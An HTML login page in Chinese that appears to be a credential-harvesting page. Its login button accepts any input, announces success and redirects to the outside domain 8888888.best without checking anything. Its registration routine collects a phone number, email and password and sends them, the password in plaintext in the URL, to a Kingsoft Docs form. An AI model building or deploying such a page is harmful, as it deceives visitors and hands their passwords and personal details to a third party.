<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>账号登录</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            min-height:100vh;
            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
            display:flex;align-items:center;justify-content:center;
            font-family:"Microsoft Yahei",sans-serif;
            padding:20px;
        }
        .login-card{
            background:#fff;padding:50px 40px;border-radius:20px;
            width:100%;max-width:500px;box-shadow:0 10px 40px rgba(0,0,0,0.15);
        }
        h1{text-align:center;margin-bottom:40px;color:#111;font-weight:600;}
        .form-item{margin-bottom:25px;}
        .form-item label{display:block;margin-bottom:10px;color:#444;font-size:16px;}
        .form-item input{
            width:100%;padding:15px;border:1px solid #ddd;
            border-radius:10px;font-size:16px;outline:none;transition:0.3s;
        }
        .form-item input:focus{border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.15);}
        .forget-pwd{text-align:right;margin:-10px 0 30px 0;}
        .forget-pwd a{color:#667eea;text-decoration:none;font-size:15px;}
        .login-btn{
            width:100%;padding:16px;border:none;border-radius:10px;
            background:linear-gradient(90deg,#667eea 0%,#764ba2 100%);
            color:white;font-size:18px;cursor:pointer;transition:0.3s;
        }
        .login-btn:hover{opacity:0.92;}
        .reg-tip{text-align:center;margin-top:30px;color:#666;font-size:16px;}
        .reg-tip a{color:#667eea;text-decoration:none;font-weight:500;}
    </style>
</head>
<body>
<div class="login-card">
    <h1>账号登录</h1>

    <div class="form-item">
        <label>手机号</label>
        <input type="tel" id="phone" placeholder="请输入手机号">
    </div>
    <div class="form-item">
        <label>邮箱</label>
        <input type="email" id="email" placeholder="请输入邮箱">
    </div>
    <div class="form-item">
        <label>登录密码</label>
        <input type="password" id="pwd" placeholder="请输入登录密码">
    </div>

    <div class="forget-pwd">
        <a href="javascript:alert('请联系管理员重置密码')">忘记密码？</a>
    </div>

    <button class="login-btn" onclick="userLogin()">立即登录</button>

    <div class="reg-tip">
        还没有账号？ <a href="javascript:userRegister()">立即注册</a>
    </div>
</div>

<script>
// 登录校验
function userLogin(){
    const phone = document.getElementById('phone').value.trim();
    const email = document.getElementById('email').value.trim();
    const pwd = document.getElementById('pwd').value.trim();

    if(!phone || !email || !pwd){
        alert('手机号、邮箱、密码必须全部填写！');
        return;
    }

    alert('✅ 登录成功，正在跳转');
    location.href = "https://8888888.best/index.html";
}

// 注册 强制完整校验 + 精准匹配3字段提交
function userRegister(){
    // 1. 收集完整三项信息
    const phone = prompt("请输入【必填手机号】：");
    if(!phone || phone.length !== 11 || isNaN(phone)){
        alert('请输入正确的11位手机号！');
        return;
    }

    const email = prompt("请输入【必填邮箱地址】：");
    const emailReg = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if(!email || !emailReg.test(email)){
        alert('请输入有效的邮箱地址！');
        return;
    }

    const pwd = prompt("请设置登录密码（至少6位）：");
    if(!pwd || pwd.length < 6){
        alert('密码长度不能少于6位！');
        return;
    }

    // 2. 严格对应你金山表单 第1题手机号、第2题邮箱、第3题密码
    const formLink = "https://f.kdocs.cn/g/dlLFQoSv/";
    const targetUrl = `${formLink}?1=${encodeURIComponent(phone)}&2=${encodeURIComponent(email)}&3=${encodeURIComponent(pwd)}`;

    // 3. 新开页面 自动填满全部输入框
    alert('即将打开表单，信息已自动填好，仅需点击【提交】即可注册成功！');
    window.open(targetUrl, '_blank');
}
</script>
</body>
</html>
